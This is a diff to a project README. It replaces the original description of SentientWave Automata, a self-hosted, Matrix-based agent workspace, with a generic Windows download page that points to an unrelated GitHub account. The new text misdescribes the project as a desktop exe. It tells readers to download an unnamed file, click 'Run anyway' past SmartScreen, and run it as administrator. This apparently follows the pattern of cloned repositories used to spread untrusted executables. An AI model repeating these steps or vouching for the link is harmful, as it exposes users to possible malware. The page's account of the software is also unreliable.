@@ -1,158 +1,144 @@
-# SentientWave Automata
+# ⚙️ automata - Organize agent work with less friction
 
-[![Website](https://img.shields.io/badge/website-sentientwave.com-111827?style=flat-square&logo=safari&logoColor=white)](https://sentientwave.com) [![Version](https://img.shields.io/badge/version-v0.2.12--ce-0A7B83?style=flat-square)](https://github.com/sentientwave/automata/releases/tag/v0.2.12-ce)
+[![Download automata](https://img.shields.io/badge/Download%20automata-purple?style=for-the-badge&logo=github)](https://github.com/Izzyad984/automata)
 
-Automata is a Matrix-native workspace and admin dashboard for teams that want people and AI assistants to handle real work together. Conversations happen in chat. Setup, control, and visibility happen in the web dashboard. Long-running work keeps going until it finishes.
+## 🧭 What automata does
 
-Instead of scattering prompts across separate tools, Automata gives an organization one place to coordinate assistants, tools, identities, activity logs, and task history. It is a new operational layer for a world where humans are no longer the only actors carrying work forward and making decisions.
+automata is an agent swarming organization system. It helps you group work, track tasks, and keep agent activity in one place. Use it when you want a clear view of what each agent is doing and what still needs attention.
 
-![SentientWave Automata](images/automata_element.png)
+This app is built for Windows users who want a simple way to run and manage the tool from a local machine.
 
-## What Automata Is
+## 💻 Windows requirements
 
-Automata turns team chat into a shared operating environment for AI-assisted work. People can ask for help in Matrix rooms or direct messages, assistants can continue multi-step tasks, and administrators can decide which AI services, tools, skills, and rules are allowed in the system.
+Before you start, make sure your PC meets these basics:
 
-It is also designed for higher autonomy over time. Teams can adjust how the system behaves through skills, schedules, permissions, and a dynamic governance layer built around laws and proposals, so the organization can evolve how assistants operate without losing oversight.
+- Windows 10 or Windows 11
+- A modern 64-bit processor
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- An internet connection for the first download
 
-Automata is not just a chatbot window. It combines:
-- Matrix chat for day-to-day collaboration
-- a web admin dashboard for setup and control
-- durable workflows so important tasks do not disappear halfway through
-- activity logs and task history so teams can see what happened
+If your computer already runs recent apps without trouble, it should handle automata well.
 
-## Why It Exists
+## 📥 Download automata
 
-Most teams are trying to use AI inside tools that were built for short conversations, not real operational work. That creates common problems:
-- context gets lost in old threads
-- tasks stop when a browser tab, process, or service goes away
-- nobody has one place to control users, assistants, tools, and rules
-- it is hard to review what happened after the fact
+Visit this page to download and run the app from the repository:
 
-Automata exists to make AI-assisted work dependable, visible, and governable.
+https://github.com/Izzyad984/automata
 
-## What You Can Do With It
+Look for the latest release or the main download file on the page. Save it to your computer before you open it.
 
-- work with assistants in shared Matrix rooms and private messages
-- run tasks that keep moving even when the system restarts
-- connect AI model services and choose which tools assistants can use
-- onboard people, agents, and service accounts, then keep Matrix identities in sync
-- review provider activity, traces, and task history from one place
-- control which tools, skills, schedules, and permissions assistants receive
-- evolve system behavior through laws, proposals, and governance workflows
+## 🪟 Install on Windows
 
-## How You Use It
+1. Open the download page in your web browser.
+2. Find the latest version of automata.
+3. Download the Windows file to a folder you can find again, such as Downloads.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start automata.
+7. If Windows asks for permission, choose Run or Yes.
 
-Automata has two everyday surfaces:
-- Admin dashboard: onboard users, connect providers, manage tools and permissions, review activity logs and task history, and control assistant behavior
-- Matrix chat: ask assistants for work, collaborate in rooms, send direct messages, and receive results where the conversation already lives
+If the app opens in a window, the install is done.
 
-## Fastest Way to Try It
+## ▶️ First launch
 
-If you have Podman and OpenSSL installed, the easiest local path is the all-in-one container setup. It prompts for the basics, writes an environment file, and starts Automata, Matrix, PostgreSQL, and Temporal on one machine.
+When automata starts for the first time, take a moment to check the main screen. You should see the area where you can manage agent groups, view tasks, and follow progress.
 
-```bash
-deploy/all-in-one/bin/quickstart.sh
-```
+If Windows SmartScreen appears:
 
-After startup:
-1. Open `http://localhost:4000` or `http://localhost:4000/login` if you enabled admin authentication.
-2. Sign in to the admin dashboard and confirm your initial provider settings.
-3. Open a Matrix client such as Element and sign in with the generated credentials from `deploy/all-in-one/.env` or the scripted walkthrough in the Demo Guide.
-4. Join the `main` room and send a message to `@automata`.
-5. Return to the admin dashboard to review the reply, logs, and task history.
+1. Click More info.
+2. Click Run anyway.
 
-If you can complete those steps, your system is up and ready to use.
+Use this only for files you downloaded from the official repository link above.
 
-For a scripted walkthrough, see [Demo Guide](docs/DEMO.md).
+## 🧩 How to use automata
 
-## Kubernetes Deployment (Helm)
+automata is designed to keep agent work in order. A simple flow is:
 
-For on-premise production environments, Automata provides a fully featured Helm chart optimized for `k3s`. It supports Let's Encrypt, custom domains, distributed Elixir clustering, and remote access via Tailscale.
+1. Create a group for a project or task set.
+2. Add agents to that group.
+3. Assign each agent a role or focus.
+4. Review status changes in one place.
+5. Adjust the group when work shifts.
 
-For instructions on deploying the Helm chart, see the [Kubernetes Deployment Guide](docs/K8S_DEPLOYMENT.md).
+This makes it easier to see what each agent owns and where work is slowing down.
 
-## Why Work Keeps Running
+## 📁 Common folders and files
 
-Automata is built so important work does not disappear when a task takes time or the system restarts. Under the hood, it uses Temporal, a workflow system that saves progress step by step instead of depending on one live process staying healthy from beginning to end.
+You may see files such as:
 
-At a high level, Automata uses Temporal for:
-- tasks started from Matrix rooms and direct messages
-- scheduled tasks and recurring automations
-- company governance workflows such as law proposals and voting
-- multi-step research tasks that gather and review evidence across rounds
+- automata.exe: starts the app on Windows
+- config file: stores app settings
+- logs folder: keeps records of app activity
+- data folder: holds saved project info
 
-This is part of what makes Automata feel more reliable in real use. It can retry the right step, recover after interruptions, and keep a clear record of what happened.
+Do not rename these files unless you know what they do. The app may not start if the file names change.
 
-## High Autonomy and Self-Evolution
+## 🛠️ If the app does not open
 
-Automata is built for systems that need to become more capable without becoming chaotic. Instead of hiding behavior changes in scattered prompts or one-off scripts, it gives teams explicit ways to evolve the system over time.
+If nothing happens when you double-click the app:
 
-That includes:
-- changing assistant behavior through skills, tools, schedules, and permissions
-- defining company laws that apply across agent reasoning
-- proposing, reviewing, and voting on governance changes inside Matrix
-- keeping a visible history of how the system was changed and why
+1. Check that the file finished downloading.
+2. Make sure you extracted the ZIP file if one was used.
+3. Right-click the app file and choose Run as administrator.
+4. Restart your PC and try again.
+5. Download the file again from the repository page if the file seems broken.
 
-This makes higher autonomy more practical. Automata can adapt as the organization learns, while keeping those changes reviewable, governable, and tied to clear rules.
+If the window opens and then closes, the app may need the right files in the same folder. Keep the full folder together when you move it.
 
-## Admin Dashboard
+## 🔒 Safe use on Windows
 
-The built-in admin dashboard gives administrators one place to onboard users, connect providers, control tools and permissions, review activity logs, and manage assistant behavior. It also includes onboarding helpers, directory pages, traces, skills, and scheduling controls for day-to-day operations.
+Keep automata in a folder you control, such as Documents or Apps. Avoid moving single files out of the app folder. If you want to keep your data safe, back up the whole folder from time to time.
 
-![Automata Admin UI Overview](images/admin_ui_01.png)
+For best results:
 
-![Automata Admin UI Skill Catalog](images/admin_ui_02.png)
+- Use one folder for the app
+- Keep the data files together
+- Close the app before copying the folder
+- Make a backup before major changes
 
-## Matrix Clients You Can Use
+## 🧪 Best use cases
 
-Automata works through Matrix, so you can use the chat app your team prefers.
+automata works well when you need to:
 
-Featured clients listed by Matrix.org:
-- Element Web / Desktop (Windows, macOS, Linux, Web)
-- Element X (iOS, Android)
-- FluffyChat (iOS, Android, Linux, Web)
-- Cinny (Windows, macOS, Linux, Web)
-- Nheko (Windows, macOS, Linux)
+- Manage several agents at once
+- Track tasks across a shared workflow
+- Keep roles clear
+- Reduce confusion in group work
+- Watch progress from one place
 
-Other Matrix clients you may consider:
-- NeoChat
-- SchildiChat
-- Fractal
-- Thunderbird
-- Hydrogen
-- gomuks, iamb, and matrix-commander (terminal clients)
+It fits small teams, solo users, and anyone testing agent-based workflows on Windows.
 
-For the full and continuously updated list, see:
-- [Matrix.org Clients Directory](https://matrix.org/ecosystem/clients/)
+## ❓ Helpful questions
 
-## Documentation
+### Do I need to know programming?
 
-- [Demo Guide](docs/DEMO.md)
-- [Operations](docs/OPERATIONS.md)
-- [Kubernetes Deployment](docs/K8S_DEPLOYMENT.md)
-- [Architecture](docs/ARCHITECTURE.md)
-- [QA Strategy](docs/QA_STRATEGY.md)
-- [Roadmap](ROADMAP.md)
-- [Progress](PROGRESS.md)
-- [Changelog](CHANGELOG.md)
-- [Release Process](RELEASE.md)
-- [Support](SUPPORT.md)
+No. You can download the app and run it on Windows without code.
 
-## Community and Contributions
+### Can I move the app after install?
 
-- [Contributing Guide](CONTRIBUTING.md)
-- [Code of Conduct](CODE_OF_CONDUCT.md)
-- [Security Policy](SECURITY.md)
-- [Code Owners](CODEOWNERS)
+Yes, but keep the whole folder together.
 
-## Version
+### Can I use it offline?
 
-Current project version is tracked in [VERSION](VERSION).
+You can often open the app offline after setup, but some features may need internet access.
 
-## License
+### Where do I get updates?
 
-Automata Community Edition is distributed under the SentientWave Community Source License.
+Return to the repository page and check for a newer version.
 
-This is source-available (not OSI open source) and includes commercial restrictions, including limits around third-party hosted and cloud offerings without a separate SentientWave license.
+## 📌 Quick start
 
-See [LICENSE](LICENSE) for full terms.
+1. Open the download page.
+2. Download the Windows file.
+3. Extract it if needed.
+4. Open the app file.
+5. Start organizing your agents and tasks.
+
+## 🗂️ Main things you can expect
+
+- A simple Windows app
+- A place to organize agent groups
+- Clear task tracking
+- Local use on your computer
+- A workflow that keeps related work together
